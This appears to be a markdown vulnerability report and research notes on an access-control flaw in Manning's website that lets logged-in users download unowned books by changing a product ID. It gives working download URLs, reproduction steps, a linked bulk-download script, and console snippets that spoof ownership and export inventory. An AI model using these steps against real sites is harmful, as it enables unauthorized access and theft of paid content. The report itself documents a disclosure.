# Bug report

## Clear description of the bug & Real-world impact

Within the Manning website, and given a user is logged in;
books PDF downloads are allowed given a book_id whether the bok is owned by the user or not.
This means that an attacker can crawl the Manning catalog for all book ids,
and download all Manning books for free.

Edit 1:
Not only PDF are affected; Epub and Kindle formats as well.

Edit 2:
After trying to download all books, I saw that 349 books are affected. The others have 404 status code.

## Concise reproduction steps

- Log into the application as a regular user
- Go to https://www.manning.com/dashboard/download?productId={book_id}&downloadFormat=PDF
- https://www.manning.com/dashboard/download?productId=1619&downloadFormat=PDF
and replace the book_id by the id of your liking.
For example for "Tuning Up" https://www.manning.com/dashboard/download?productId=1308&downloadFormat=PDF.

## Working examples

Screenshot:

![](./img/download_books.png)

Source code snippets: https://gist.github.com/louisguitton/9bfb2e4e7c62a945a97d59db434009f4

```sh
pip install -r requirements.txt
# setup chromedriver by following https://chromedriver.chromium.org/getting-started
export MANNING_USERNAME=xxxx
export MANNING_PASSWORD=xxxx
python download_books.py
```

## blog post ideas

### title ideas

- So scraping bookies websites and odds worked also to get access to 10k worth of education
- how I hacked manning and helped them fix it

### Talk with Manning

- I'm not part of the Hacker community. I have not hacking in my spare time on weekends. I am not a bounty hunter. I'm just a senior engineer who has technical reflexes when I face a user issue
- You might know white hat / black hat hacking. I ended up doing what's called gey hat hacking
- I did avoid anything that could cause damage (like data loss etc...) https://security.stackexchange.com/questions/243875/could-bug-bounty-hunting-accidentally-cause-real-damage
- levels of severity = critical / high / medium / low based on CVSS + my own understanding of the business impact
- Tools / SaaS services to get your security checked
  - https://www.federacy.com/ (a Ycombinator company)
  - https://www.getastra.com/ (in github student pack)
- blog https://samcurry.net/hacking-apple/

## Findings

### Information Gathering

- technologies used on the website: wordpress
  - https://builtwith.com/manning.com
  - https://sitereport.netcraft.com/?url=manning.com
  - https://w3techs.com/sites/info/manning.com
- uses S3 to store content, ex: https://manning-content.s3.amazonaws.com/download/4/5c0b22f-03d6-4fd9-829f-0fe71db5f25f/dlwpt-code-master.zip or https://manning-content.s3.amazonaws.com/download/2/6148e88-6459-4521-9c12-5fb755249632/realworldnlp-master.zip"
- DNS  Information
  - https://www.robtex.com/dns-lookup/manning.com

### Licenses

- https://www.manning.com/dashboard/getLicensesAjax?isDropboxIntegrated=&order=purchaseDate&sort=desc&filter=all returns an HTML table of owned books

- each product has "productId" (e.g. 'teofili') and a "productManningId" (e.g. '905') https://www.manning.com/api/search/shallowSearch?query=search&boostedProduct=&new=true . The productManningId is used for downloads. The productId is used for ownership rules.

    ```json
    {
        "productTitle": "Deep Learning for Search",
        "score": "12.070444",
        "productId": "teofili",
        "productManningId": "905",
        "id": "teofili-metadata-marketplace-inside",
        "productType": "marketplaceProduct"
    },
    ```

- there is an endpoint to check ownership https://www.manning.com/search/ownership and response with productIds:

    ```json
    {"213":true,"lane2":true,"sweet":true,"harenslak":true,"grigorev":true,"hagiwara":true,"raaijmakers":true,"stevens2":true,"turnbull":true}
    ```

- in dashboard's main app.js, JS function 'p.loadOwnership();' checks for user ownership of a book

    ```js
    var u, p = window.searchStore = new Search.SearchStore(
        Search.SourceApp.marketplace,
        k,
        new Search.SearchProvider(new Search.SearchWebProvider(Search.SourceApp.marketplace,k)
    )...;

    p.loadOwnership();
    ```

- in dashboard.html, the header of the HTML on the page shows that they use 2 external JS assets for search

    ```html
        <script type="text/javascript">

        var searchServerVars = {
            deploymentType: "production",
            polyfillsLocation: "/assets/search/polyfills-marketplace-05232e8143f92aac6c2589e26341a535.js",
            mainJsLocation: "/assets/search/search-app-marketplace-baa5dc1eb4c27df2fa1f06ef1c250670.js",
            coverImage: "/assets/cover-c0e554e9d065ae2e5b8b43d622fb8b95.png",
            livebookId: "",
            videoId: "",
            optimizeTest: "uN4DQcqpSzq0TPNH2R2qMw"
        }

    </script>
    ```

- When you download and unminify the 'mainJsLocation', I saw that

    ```js
    loadOwnership = function () {
        var a = this;
        this.searchProvider.getOwnershipInfo().then(function (c) {
            y.ProductUtils.userOwnedProducts = c;
            a.triggerOwnershipChange();
        });
    }
    triggerOwnershipChange = function () {
        this.changeEmitter.emit("ownershipChange");
    }
    getOwnershipInfo = function () {
        var b = this;
        return new Promise(function (a, e) {
            b.webUtils.ajax(
            (null != b.additionalParams && b.additionalParams.ownershipEndpoint) || b.webUtils.getAbsoluteBackendUrl("/search/ownership"),
            function (b) {
                return a(b);
            },
            function (a) {
                return e(a);
            }, {},
            !1,
            !0
            );
        });
    }
    ```

- this means that in the chrome console, someone can do:

    ```js
    var p = window.searchStore;
    p.searchProvider.getOwnershipInfo().then(function (c) {
        xxx.ProductUtils.userOwnedProducts = {...c, "teofili": true}
        // not Search
        // not this.ProductProvider.provider.ProductUtils.userOwnedProducts
        p.triggerOwnershipChange();
    })

- it's possible to download all inventory data with

    ```js
    function downloadObjectAsJson(exportObj, exportName){
        var dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(exportObj));
        var downloadAnchorNode = document.createElement('a');
        downloadAnchorNode.setAttribute("href",     dataStr);
        downloadAnchorNode.setAttribute("download", exportName + ".json");
        document.body.appendChild(downloadAnchorNode); // required for firefox
        downloadAnchorNode.click();
        downloadAnchorNode.remove();
    }

    var p = window.searchStore;
    p.searchProvider.productProvider.productInfosPromise.then(function (c) {
        downloadObjectAsJson(c, "inventory")
    });
    ```
